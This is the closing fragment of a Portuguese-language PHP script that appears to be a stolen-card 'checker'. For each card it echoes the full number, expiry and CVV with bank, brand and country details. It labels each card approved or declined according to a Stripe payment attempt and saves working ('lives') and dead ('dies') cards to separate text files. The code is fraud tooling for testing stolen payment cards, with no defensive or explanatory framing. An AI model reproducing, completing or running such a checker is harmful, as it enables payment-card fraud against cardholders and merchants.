    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » $retorno  » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


} else if (empty($pagar)) {

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>RETORNO N/A</span> » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

else{

    echo "<span class='badge badge-success'>Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-info'>Retorno:</span> » Transacão aprovada, por Stripe Payment! ($retorno_gat) » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";


      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


}



?>